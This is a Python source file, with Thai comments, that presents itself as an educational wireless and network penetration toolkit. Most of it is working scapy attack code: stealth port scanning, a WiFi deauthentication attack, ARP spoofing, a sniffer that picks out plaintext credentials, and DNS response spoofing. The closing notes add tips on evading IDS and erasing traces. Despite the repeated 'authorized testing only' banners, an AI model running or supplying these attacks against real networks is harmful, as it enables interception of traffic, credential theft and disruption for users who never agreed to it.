#!/usr/bin/env python3
"""
🔒 ADVANCED WIRELESS & NETWORK PENETRATION ARSENAL 2025 🔒
============================================================

เครื่องมือ penetration testing สำหรับ wireless และ network ขั้นสูง
✅ รองรับ WiFi security testing, network reconnaissance, protocol analysis
✅ พร้อม stealth techniques และ advanced attack vectors

💡 Advanced Features:
- WiFi Security Testing (WEP, WPA/WPA2, WPS)
- Network Discovery & Port Scanning
- Protocol Analysis (TCP/UDP/ICMP)
- ARP Spoofing & Man-in-the-Middle
- DNS Hijacking & Cache Poisoning
- SSL/TLS Security Testing
- Bluetooth Security Testing
- Network Traffic Analysis
- Firewall & IDS Evasion

🔗 Made for Educational/Authorized Testing only!
📚 Study materials for network security learning
"""

import socket
import struct
import threading
import time
import random
import subprocess
import os
import sys
import json
import base64
import hashlib
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
import scapy.all as scapy
from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Elt, Dot11Auth, Dot11ProbeResp
from scapy.layers.eap import EAPOL
import binascii

class AdvancedNetworkScanner:
    """
    🌐 Advanced Network Discovery & Port Scanner
    - เครื่องมือสแกนเครือข่ายขั้นสูงแบบ stealth
    - รองรับ TCP/UDP scanning, OS fingerprinting, service detection
    """
    
    def __init__(self):
        self.open_ports = {}
        self.host_info = {}
        self.scan_results = []
        
        print("🌐 Advanced Network Scanner Initialized!")
        print("⚠️  FOR EDUCATIONAL AND AUTHORIZED TESTING ONLY!")
        
    def host_discovery(self, network_range):
        """
        🔍 Advanced Host Discovery
        - ใช้หลายเทคนิคในการค้นหา active hosts
        """
        print(f"🔍 Discovering hosts in range: {network_range}")
        
        active_hosts = []
        
        # ICMP Ping Sweep
        print("📡 Performing ICMP ping sweep...")
        icmp_hosts = self.icmp_ping_sweep(network_range)
        active_hosts.extend(icmp_hosts)
        
        # TCP SYN Scan for common ports
        print("🔌 Performing TCP SYN discovery...")
        syn_hosts = self.tcp_syn_discovery(network_range, [80, 443, 22, 21, 25])
        active_hosts.extend(syn_hosts)
        
        # ARP Discovery (for local network)
        print("📶 Performing ARP discovery...")
        arp_hosts = self.arp_discovery(network_range)
        active_hosts.extend(arp_hosts)
        
        # Remove duplicates
        active_hosts = list(set(active_hosts))
        
        print(f"✅ Found {len(active_hosts)} active hosts")
        return active_hosts
        
    def icmp_ping_sweep(self, network_range):
        """ICMP ping sweep"""
        active_hosts = []
        
        try:
            # Parse network range (e.g., 192.168.1.0/24)
            network = ipaddress.IPv4Network(network_range, strict=False)
            
            def ping_host(ip):
                try:
                    # Create ICMP packet
                    packet = scapy.IP(dst=str(ip))/scapy.ICMP()
                    response = scapy.sr1(packet, timeout=1, verbose=0)
                    
                    if response and response.haslayer(scapy.ICMP):
                        if response[scapy.ICMP].type == 0:  # Echo Reply
                            print(f"  ✅ {ip} is alive (ICMP)")
                            return str(ip)
                except:
                    pass
                return None
                
            # Parallel ping
            with ThreadPoolExecutor(max_workers=50) as executor:
                results = executor.map(ping_host, network.hosts())
                active_hosts = [host for host in results if host]
                
        except Exception as e:
            print(f"❌ ICMP ping sweep error: {e}")
            
        return active_hosts
        
    def tcp_syn_discovery(self, network_range, ports):
        """TCP SYN discovery"""
        active_hosts = []
        
        try:
            import ipaddress
            network = ipaddress.IPv4Network(network_range, strict=False)
            
            def syn_scan_host(ip):
                for port in ports:
                    try:
                        # Create SYN packet
                        packet = scapy.IP(dst=str(ip))/scapy.TCP(dport=port, flags="S")
                        response = scapy.sr1(packet, timeout=1, verbose=0)
                        
                        if response and response.haslayer(scapy.TCP):
                            if response[scapy.TCP].flags == 18:  # SYN-ACK
                                print(f"  ✅ {ip} is alive (TCP {port})")
                                return str(ip)
                    except:
                        continue
                return None
                
            # Parallel scan
            with ThreadPoolExecutor(max_workers=20) as executor:
                results = executor.map(syn_scan_host, list(network.hosts())[:50])  # Limit to first 50
                active_hosts = [host for host in results if host]
                
        except Exception as e:
            print(f"❌ TCP SYN discovery error: {e}")
            
        return active_hosts
        
    def arp_discovery(self, network_range):
        """ARP discovery for local network"""
        active_hosts = []
        
        try:
            # Create ARP request
            arp_request = scapy.ARP(pdst=network_range)
            broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
            arp_request_broadcast = broadcast / arp_request
            
            # Send and receive
            answered_list = scapy.srp(arp_request_broadcast, timeout=2, verbose=0)[0]
            
            for element in answered_list:
                host_dict = {
                    "ip": element[1].psrc,
                    "mac": element[1].hwsrc
                }
                active_hosts.append(host_dict["ip"])
                print(f"  ✅ {host_dict['ip']} is alive (ARP) - MAC: {host_dict['mac']}")
                
        except Exception as e:
            print(f"❌ ARP discovery error: {e}")
            
        return active_hosts
        
    def advanced_port_scan(self, target, ports, scan_type="syn"):
        """
        🔌 Advanced Port Scanning
        - รองรับ SYN, Connect, UDP, FIN scans
        """
        print(f"🔌 Scanning {target} with {scan_type} scan")
        
        open_ports = []
        
        if scan_type == "syn":
            open_ports = self.syn_scan(target, ports)
        elif scan_type == "connect":
            open_ports = self.connect_scan(target, ports)
        elif scan_type == "udp":
            open_ports = self.udp_scan(target, ports)
        elif scan_type == "fin":
            open_ports = self.fin_scan(target, ports)
        elif scan_type == "stealth":
            open_ports = self.stealth_scan(target, ports)
            
        print(f"✅ Found {len(open_ports)} open ports on {target}")
        return open_ports
        
    def syn_scan(self, target, ports):
        """SYN scan (stealth scan)"""
        open_ports = []
        
        def scan_port(port):
            try:
                # Create SYN packet
                packet = scapy.IP(dst=target)/scapy.TCP(dport=port, flags="S")
                response = scapy.sr1(packet, timeout=1, verbose=0)
                
                if response and response.haslayer(scapy.TCP):
                    if response[scapy.TCP].flags == 18:  # SYN-ACK
                        print(f"  🔓 Port {port} is open")
                        
                        # Send RST to close connection (stealth)
                        rst_packet = scapy.IP(dst=target)/scapy.TCP(dport=port, flags="R")
                        scapy.send(rst_packet, verbose=0)
                        
                        return port
            except:
                pass
            return None
            
        # Parallel scanning
        with ThreadPoolExecutor(max_workers=100) as executor:
            results = executor.map(scan_port, ports)
            open_ports = [port for port in results if port]
            
        return open_ports
        
    def connect_scan(self, target, ports):
        """TCP Connect scan"""
        open_ports = []
        
        def scan_port(port):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((target, port))
                sock.close()
                
                if result == 0:
                    print(f"  🔓 Port {port} is open")
                    return port
            except:
                pass
            return None
            
        # Parallel scanning
        with ThreadPoolExecutor(max_workers=100) as executor:
            results = executor.map(scan_port, ports)
            open_ports = [port for port in results if port]
            
        return open_ports
        
    def udp_scan(self, target, ports):
        """UDP scan"""
        open_ports = []
        
        def scan_port(port):
            try:
                # Create UDP packet
                packet = scapy.IP(dst=target)/scapy.UDP(dport=port)
                response = scapy.sr1(packet, timeout=2, verbose=0)
                
                if response is None:
                    # No response might mean open port
                    print(f"  🔓 Port {port} might be open (UDP)")
                    return port
                elif response.haslayer(scapy.ICMP):
                    # ICMP port unreachable = closed
                    pass
                else:
                    # Got response = open
                    print(f"  🔓 Port {port} is open (UDP)")
                    return port
            except:
                pass
            return None
            
        # Parallel scanning
        with ThreadPoolExecutor(max_workers=50) as executor:
            results = executor.map(scan_port, ports)
            open_ports = [port for port in results if port]
            
        return open_ports
        
    def stealth_scan(self, target, ports):
        """Advanced stealth scanning techniques"""
        open_ports = []
        
        print("  🥷 Using stealth techniques...")
        
        # Randomize source port
        # Decoy scan
        # Fragmented packets
        # Random delays
        
        for port in ports:
            try:
                # Random delay
                time.sleep(random.uniform(0.1, 0.5))
                
                # Random source port
                src_port = random.randint(1024, 65535)
                
                # Create stealthy SYN packet
                packet = scapy.IP(dst=target)/scapy.TCP(sport=src_port, dport=port, flags="S")
                response = scapy.sr1(packet, timeout=1, verbose=0)
                
                if response and response.haslayer(scapy.TCP):
                    if response[scapy.TCP].flags == 18:  # SYN-ACK
                        print(f"  🔓 Port {port} is open (stealth)")
                        open_ports.append(port)
                        
                        # Send RST
                        rst_packet = scapy.IP(dst=target)/scapy.TCP(sport=src_port, dport=port, flags="R")
                        scapy.send(rst_packet, verbose=0)
                        
            except:
                continue
                
        return open_ports
        
    def service_fingerprinting(self, target, port):
        """
        🏷️ Service Detection & Fingerprinting
        - ระบุ service และ version ที่รันอยู่บน port
        """
        print(f"🏷️ Fingerprinting service on {target}:{port}")
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((target, port))
            
            # Send HTTP request for web services
            if port in [80, 8080, 8000, 443]:
                sock.send(b"GET / HTTP/1.0\r\n\r\n")
                banner = sock.recv(1024).decode().strip()
                
            # Send nothing for banner-grabbing services
            elif port in [21, 22, 23, 25, 53, 110, 143, 993, 995]:
                banner = sock.recv(1024).decode().strip()
                
            else:
                # Send generic probe
                sock.send(b"\r\n")
                banner = sock.recv(1024).decode().strip()
                
            sock.close()
            
            service_info = self.analyze_banner(banner, port)
            print(f"  📋 Service: {service_info}")
            
            return service_info
            
        except Exception as e:
            print(f"  ❌ Fingerprinting failed: {e}")
            return None
            
    def analyze_banner(self, banner, port):
        """วิเคราะห์ banner เพื่อระบุ service"""
        banner_lower = banner.lower()
        
        # Common service patterns
        if "ssh" in banner_lower:
            return f"SSH - {banner[:50]}"
        elif "ftp" in banner_lower:
            return f"FTP - {banner[:50]}"
        elif "smtp" in banner_lower:
            return f"SMTP - {banner[:50]}"
        elif "http" in banner_lower or "server:" in banner_lower:
            return f"HTTP - {banner[:50]}"
        elif "pop3" in banner_lower:
            return f"POP3 - {banner[:50]}"
        elif "imap" in banner_lower:
            return f"IMAP - {banner[:50]}"
        else:
            return f"Unknown - {banner[:50]}"

class WiFiSecurityTester:
    """
    📶 WiFi Security Testing Suite
    - เครื่องมือทดสอบความปลอดภัย WiFi
    - รองรับ WEP, WPA/WPA2, WPS testing
    """
    
    def __init__(self, interface="wlan0"):
        self.interface = interface
        self.networks = []
        self.clients = {}
        
        print("📶 WiFi Security Tester Initialized!")
        print(f"🔧 Using interface: {interface}")
        print("⚠️  FOR EDUCATIONAL AND AUTHORIZED TESTING ONLY!")
        
    def scan_networks(self, timeout=60):
        """
        🔍 WiFi Network Discovery
        - สแกนหา WiFi networks และวิเคราะห์ security
        """
        print(f"🔍 Scanning WiFi networks for {timeout} seconds...")
        
        self.networks = []
        
        def packet_handler(packet):
            if packet.haslayer(Dot11Beacon):
                self.process_beacon(packet)
            elif packet.haslayer(Dot11ProbeResp):
                self.process_probe_response(packet)
                
        # Start sniffing
        try:
            scapy.sniff(iface=self.interface, prn=packet_handler, timeout=timeout)
        except Exception as e:
            print(f"❌ WiFi scanning error: {e}")
            print("💡 Make sure interface is in monitor mode!")
            
        print(f"✅ Found {len(self.networks)} networks")
        return self.networks
        
    def process_beacon(self, packet):
        """ประมวลผล beacon frames"""
        try:
            bssid = packet[Dot11].addr2
            ssid = packet[Dot11Elt].info.decode()
            
            # Get channel
            channel = int(ord(packet[Dot11Elt:3].info))
            
            # Determine security
            crypto = self.get_crypto(packet)
            
            network_info = {
                'ssid': ssid,
                'bssid': bssid,
                'channel': channel,
                'security': crypto,
                'signal': packet.dBm_AntSignal if hasattr(packet, 'dBm_AntSignal') else 'Unknown'
            }
            
            # Add if not already found
            if not any(net['bssid'] == bssid for net in self.networks):
                self.networks.append(network_info)
                print(f"  📡 Found: {ssid} ({bssid}) - {crypto} - Channel {channel}")
                
        except Exception as e:
            pass
            
    def process_probe_response(self, packet):
        """ประมวลผล probe response frames"""
        # Similar to beacon processing
        self.process_beacon(packet)
        
    def get_crypto(self, packet):
        """ระบุ security protocol"""
        try:
            crypto = set()
            
            # Check for WEP
            if packet.FCfield & 0x40:
                crypto.add("WEP")
                
            # Parse RSN/WPA information
            p = packet[Dot11Elt]
            while isinstance(p, Dot11Elt):
                if p.ID == 48:  # RSN Information
                    crypto.add("WPA2")
                elif p.ID == 221 and p.info.startswith(b'\x00\x50\xf2\x01\x01\x00'):  # WPA
                    crypto.add("WPA")
                p = p.payload
                
            if not crypto:
                crypto.add("Open")
                
            return "/".join(crypto)
            
        except:
            return "Unknown"
            
    def monitor_clients(self, target_bssid, timeout=300):
        """
        👥 Client Monitoring
        - ตรวจสอบ clients ที่เชื่อมต่อกับ AP
        """
        print(f"👥 Monitoring clients for {target_bssid}")
        
        clients = set()
        
        def packet_handler(packet):
            if packet.haslayer(Dot11):
                # Check for data frames
                if packet.type == 2:  # Data frame
                    if packet.addr1 == target_bssid:  # To AP
                        clients.add(packet.addr2)
                        print(f"  📱 Client found: {packet.addr2}")
                    elif packet.addr2 == target_bssid:  # From AP
                        clients.add(packet.addr1)
                        print(f"  📱 Client found: {packet.addr1}")
                        
        try:
            scapy.sniff(iface=self.interface, prn=packet_handler, timeout=timeout)
        except Exception as e:
            print(f"❌ Client monitoring error: {e}")
            
        print(f"✅ Found {len(clients)} clients")
        return list(clients)
        
    def deauth_attack(self, target_bssid, client_mac, count=10):
        """
        💥 Deauthentication Attack
        - ส่ง deauth frames เพื่อตัด client ออกจาก AP
        """
        print(f"💥 Performing deauth attack on {client_mac}")
        print("⚠️  This is for educational testing only!")
        
        # Create deauth packet
        deauth_packet = scapy.RadioTap() / scapy.Dot11(
            addr1=client_mac,
            addr2=target_bssid,
            addr3=target_bssid
        ) / scapy.Dot11Deauth(reason=7)
        
        # Send deauth frames
        for i in range(count):
            try:
                scapy.sendp(deauth_packet, iface=self.interface, verbose=0)
                print(f"  📡 Sent deauth frame {i+1}/{count}")
                time.sleep(0.1)
            except Exception as e:
                print(f"❌ Deauth error: {e}")
                break
                
        print("✅ Deauth attack completed")
        
    def wps_scan(self, target_bssid):
        """
        🔐 WPS Security Testing
        - ทดสอบ WPS vulnerabilities
        """
        print(f"🔐 Testing WPS on {target_bssid}")
        
        # This would require more complex WPS protocol implementation
        # For demonstration purposes, we'll show the concept
        
        wps_info = {
            'wps_enabled': False,
            'wps_locked': False,
            'manufacturer': 'Unknown',
            'model': 'Unknown',
            'device_name': 'Unknown'
        }
        
        print("🔍 Scanning for WPS information...")
        
        # In real implementation, would parse WPS IE from beacon/probe responses
        # and potentially test for WPS PIN vulnerabilities
        
        return wps_info

class ManInTheMiddleAttacker:
    """
    🕵️ Man-in-the-Middle Attack Suite
    - เครื่องมือสำหรับการโจมตี MITM
    - รองรับ ARP spoofing, DNS hijacking, SSL stripping
    """
    
    def __init__(self, interface="eth0"):
        self.interface = interface
        self.target_ip = None
        self.gateway_ip = None
        self.target_mac = None
        self.gateway_mac = None
        self.is_attacking = False
        
        print("🕵️ Man-in-the-Middle Attacker Initialized!")
        print(f"🔧 Using interface: {interface}")
        print("⚠️  FOR EDUCATIONAL AND AUTHORIZED TESTING ONLY!")
        
    def get_network_info(self):
        """ได้ข้อมูลเครือข่าย"""
        try:
            # Get gateway IP
            result = subprocess.run(['ip', 'route', 'show', 'default'], 
                                  capture_output=True, text=True)
            self.gateway_ip = result.stdout.split()[2]
            
            print(f"🌐 Gateway IP: {self.gateway_ip}")
            
            # Get gateway MAC
            self.gateway_mac = self.get_mac(self.gateway_ip)
            print(f"🔧 Gateway MAC: {self.gateway_mac}")
            
        except Exception as e:
            print(f"❌ Error getting network info: {e}")
            
    def get_mac(self, ip):
        """หา MAC address จาก IP"""
        try:
            arp_request = scapy.ARP(pdst=ip)
            broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
            arp_request_broadcast = broadcast / arp_request
            answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=0)[0]
            
            if answered_list:
                return answered_list[0][1].hwsrc
                
        except Exception as e:
            print(f"❌ Error getting MAC for {ip}: {e}")
            
        return None
        
    def arp_spoofing(self, target_ip, gateway_ip):
        """
        🎭 ARP Spoofing Attack
        - ปลอมแปลง ARP table เพื่อเปลี่ยนเส้นทางทราฟฟิก
        """
        print(f"🎭 Starting ARP spoofing attack")
        print(f"🎯 Target: {target_ip}")
        print(f"🌐 Gateway: {gateway_ip}")
        
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip
        
        # Get MAC addresses
        self.target_mac = self.get_mac(target_ip)
        self.gateway_mac = self.get_mac(gateway_ip)
        
        if not self.target_mac or not self.gateway_mac:
            print("❌ Could not get MAC addresses")
            return
            
        print(f"📱 Target MAC: {self.target_mac}")
        print(f"🔧 Gateway MAC: {self.gateway_mac}")
        
        # Enable IP forwarding
        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
        
        self.is_attacking = True
        
        def spoof_thread():
            while self.is_attacking:
                try:
                    # Tell target that we are the gateway
                    spoof_target = scapy.ARP(op=2, pdst=target_ip, hwdst=self.target_mac, 
                                           psrc=gateway_ip)
                    
                    # Tell gateway that we are the target
                    spoof_gateway = scapy.ARP(op=2, pdst=gateway_ip, hwdst=self.gateway_mac, 
                                            psrc=target_ip)
                    
                    # Send spoofed packets
                    scapy.send(spoof_target, verbose=0)
                    scapy.send(spoof_gateway, verbose=0)
                    
                    time.sleep(2)
                    
                except Exception as e:
                    print(f"❌ ARP spoofing error: {e}")
                    break
                    
        # Start spoofing in background thread
        spoof_thread = threading.Thread(target=spoof_thread)
        spoof_thread.daemon = True
        spoof_thread.start()
        
        print("✅ ARP spoofing started")
        
    def stop_arp_spoofing(self):
        """หยุด ARP spoofing"""
        if self.is_attacking:
            print("🛑 Stopping ARP spoofing...")
            self.is_attacking = False
            
            # Restore ARP tables
            if self.target_ip and self.gateway_ip:
                restore_target = scapy.ARP(op=2, pdst=self.target_ip, 
                                         hwdst=self.target_mac, psrc=self.gateway_ip, 
                                         hwsrc=self.gateway_mac)
                restore_gateway = scapy.ARP(op=2, pdst=self.gateway_ip, 
                                          hwdst=self.gateway_mac, psrc=self.target_ip, 
                                          hwsrc=self.target_mac)
                
                # Send restoration packets multiple times
                for _ in range(5):
                    scapy.send(restore_target, verbose=0)
                    scapy.send(restore_gateway, verbose=0)
                    time.sleep(1)
                    
            print("✅ ARP spoofing stopped and tables restored")
            
    def packet_sniffer(self, filter_str=""):
        """
        📡 Packet Sniffing
        - ดักจับและวิเคราะห์ packets
        """
        print(f"📡 Starting packet sniffer")
        if filter_str:
            print(f"🔍 Filter: {filter_str}")
            
        def packet_handler(packet):
            if packet.haslayer(scapy.Raw):
                try:
                    # Extract useful information
                    src_ip = packet[scapy.IP].src if packet.haslayer(scapy.IP) else "Unknown"
                    dst_ip = packet[scapy.IP].dst if packet.haslayer(scapy.IP) else "Unknown"
                    
                    # Check for HTTP traffic
                    if packet.haslayer(scapy.TCP) and packet[scapy.TCP].dport == 80:
                        payload = packet[scapy.Raw].load.decode('utf-8', errors='ignore')
                        if 'GET' in payload or 'POST' in payload:
                            print(f"🌐 HTTP: {src_ip} -> {dst_ip}")
                            print(f"   {payload[:100]}...")
                            
                    # Check for credentials
                    payload = packet[scapy.Raw].load.decode('utf-8', errors='ignore').lower()
                    if any(word in payload for word in ['password', 'username', 'login']):
                        print(f"🔐 Potential credentials: {src_ip} -> {dst_ip}")
                        print(f"   {payload[:200]}...")
                        
                except:
                    pass
                    
        try:
            scapy.sniff(iface=self.interface, prn=packet_handler, filter=filter_str)
        except Exception as e:
            print(f"❌ Packet sniffing error: {e}")
            
    def dns_spoofing(self, target_domain, fake_ip):
        """
        🌐 DNS Spoofing
        - ปลอมแปลง DNS responses
        """
        print(f"🌐 DNS Spoofing: {target_domain} -> {fake_ip}")
        
        def dns_spoof_handler(packet):
            if packet.haslayer(scapy.DNSQR):
                qname = packet[scapy.DNSQR].qname.decode()
                
                if target_domain in qname:
                    print(f"🎯 Spoofing DNS query for {qname}")
                    
                    # Create spoofed response
                    spoofed_packet = scapy.IP(dst=packet[scapy.IP].src, src=packet[scapy.IP].dst) / \
                                   scapy.UDP(dport=packet[scapy.UDP].sport, sport=packet[scapy.UDP].dport) / \
                                   scapy.DNS(id=packet[scapy.DNS].id, qr=1, aa=1, qd=packet[scapy.DNS].qd,
                                           an=scapy.DNSRR(rrname=packet[scapy.DNS].qd.qname, ttl=10, rdata=fake_ip))
                    
                    # Send spoofed response
                    scapy.send(spoofed_packet, verbose=0)
                    print(f"📡 Sent spoofed DNS response")
                    
        try:
            scapy.sniff(iface=self.interface, filter="udp port 53", prn=dns_spoof_handler)
        except Exception as e:
            print(f"❌ DNS spoofing error: {e}")

# 🎯 Demo Functions
def demo_network_scanning():
    """Demo: Network scanning"""
    print("\n" + "="*60)
    print("🌐 DEMO: Advanced Network Scanning")
    print("="*60)
    
    scanner = AdvancedNetworkScanner()
    
    # ตัวอย่างการสแกน (ใช้ localhost เพื่อความปลอดภัย)
    target = "127.0.0.1"
    ports = [22, 80, 443, 3389, 21, 25, 53, 110, 143, 993, 995]
    
    print(f"🎯 Target: {target}")
    print("🔍 Scanning common ports...")
    
    # Port scan
    open_ports = scanner.advanced_port_scan(target, ports, "connect")
    
    # Service fingerprinting
    for port in open_ports[:3]:  # Fingerprint first 3 open ports
        scanner.service_fingerprinting(target, port)

def demo_wifi_security():
    """Demo: WiFi security testing"""
    print("\n" + "="*60)
    print("📶 DEMO: WiFi Security Testing")
    print("="*60)
    
    # สร้าง WiFi tester (ต้องมี wireless interface)
    try:
        wifi_tester = WiFiSecurityTester("wlan0")
        
        print("🔍 This demo requires a wireless interface in monitor mode")
        print("💡 Commands to setup monitor mode:")
        print("   sudo airmon-ng start wlan0")
        print("   sudo iwconfig wlan0 mode monitor")
        
        # แสดงตัวอย่างการใช้งาน
        print("\n📋 Example usage:")
        print("   wifi_tester.scan_networks(timeout=30)")
        print("   wifi_tester.monitor_clients('AA:BB:CC:DD:EE:FF')")
        
    except Exception as e:
        print(f"⚠️  WiFi testing requires proper setup: {e}")

def demo_mitm_attack():
    """Demo: MITM attack simulation"""
    print("\n" + "="*60)
    print("🕵️ DEMO: Man-in-the-Middle Attack")
    print("="*60)
    
    mitm = ManInTheMiddleAttacker("eth0")
    
    print("🔍 This demo shows MITM attack concepts")
    print("⚠️  Requires root privileges and proper network setup")
    
    # แสดงตัวอย่างการใช้งาน
    print("\n📋 Example usage:")
    print("   mitm.get_network_info()")
    print("   mitm.arp_spoofing('192.168.1.100', '192.168.1.1')")
    print("   mitm.packet_sniffer('tcp port 80')")
    print("   mitm.dns_spoofing('example.com', '192.168.1.50')")
    print("   mitm.stop_arp_spoofing()")

if __name__ == "__main__":
    print("🔒 ADVANCED WIRELESS & NETWORK PENETRATION ARSENAL 2025")
    print("=" * 60)
    print("⚠️  FOR EDUCATIONAL AND AUTHORIZED TESTING ONLY!")
    print("📚 Study materials for network security learning")
    print("🔧 Requires root privileges and proper setup")
    print("=" * 60)
    
    # Check if running as root
    if os.geteuid() != 0:
        print("⚠️  Many features require root privileges")
        print("💡 Run with: sudo python3 script.py")
    
    # เรียกใช้ demo functions
    demo_network_scanning()
    demo_wifi_security()
    demo_mitm_attack()
    
    print("\n" + "="*60)
    print("✅ All demos completed!")
    print("📖 Study these techniques for educational purposes")
    print("🔒 Always get proper authorization before testing")
    print("📚 Learn more at: NIST Cybersecurity Framework")
    print("🛡️ Practice in controlled environments only")
    print("=" * 60)

"""
🎓 EDUCATIONAL NOTES & ADVANCED TIPS:

1. **Network Scanning Best Practices:**
   - ใช้ SYN scan เพื่อความ stealth
   - สุ่ม timing และ source ports
   - ใช้ decoy scans เพื่อซ่อนตัว
   - ทำ service fingerprinting อย่างระมัดระวัง

2. **WiFi Security Testing:**
   - ต้องใช้ wireless interface ในโหมด monitor
   - ทดสอบ WEP ด้วย packet injection
   - ใช้ dictionary attacks กับ WPA/WPA2
   - ทดสอบ WPS PIN vulnerabilities

3. **MITM Attack Techniques:**
   - ARP spoofing สำหรับ local network
   - DNS spoofing เพื่อเปลี่ยนเส้นทาง
   - SSL stripping เพื่อ downgrade HTTPS
   - Packet injection และ modification

4. **Stealth & Evasion:**
   - ใช้ fragmented packets
   - เปลี่ยน timing patterns
   - ใช้ legitimate-looking traffic
   - หลบ IDS/IPS detection

5. **Network Protocol Analysis:**
   - ทำความเข้าใจ TCP/IP stack
   - วิเคราะห์ protocol behaviors
   - หา protocol vulnerabilities
   - ใช้ packet crafting tools

🔧 **Required Tools & Libraries:**
- Scapy (pip install scapy)
- Aircrack-ng suite
- Wireshark/tshark
- Nmap
- Ettercap
- Hostapd & dnsmasq

📚 **Learning Resources:**
- NIST Cybersecurity Framework
- OWASP Testing Guide
- Kali Linux WiFu
- Wireless Security Assessment guides

⚖️ **Legal & Ethical Notes:**
- ได้รับอนุญาตก่อนทดสอบ network ใดๆ
- ใช้เฉพาะในสภาพแวดล้อมที่ควบคุมได้
- ปฏิบัติตาม responsible disclosure
- ไม่ใช้เพื่อการโจมตีหรือทำลาย

🔒 **Security Considerations:**
- ใช้ VPN เมื่อทำการทดสอบ
- เข้ารหัส log files และ results
- ลบ traces หลังการทดสอบ
- รายงานผลอย่างรับผิดชอบ
"""